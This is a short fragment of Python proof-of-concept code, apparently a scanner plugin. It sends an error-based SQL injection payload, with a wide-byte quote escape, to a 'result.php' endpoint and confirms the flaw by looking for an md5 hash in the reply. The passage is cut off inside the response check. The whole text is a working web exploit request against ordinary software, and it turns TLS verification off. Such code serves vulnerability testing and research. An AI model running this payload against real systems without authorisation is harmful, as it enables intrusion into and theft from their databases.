...
def poc(target):
    randstr = randomInt(1000000, 9999999)
    url = target + f"/general/score/flow/scoredate/result.php?FLOW_ID=11%bf%27%20and%20(SELECT%201%20from%20(select%20count(*),concat(floor(rand(0)*2),md5({randstr}),1,1)a%20from%20information_schema.tables%20group%20by%20a)b)%23"

    try:
        response = requests.get(url, timeout=8, verify=False)
        if md5(str(randstr).encode()).hexdigest() in response.text:
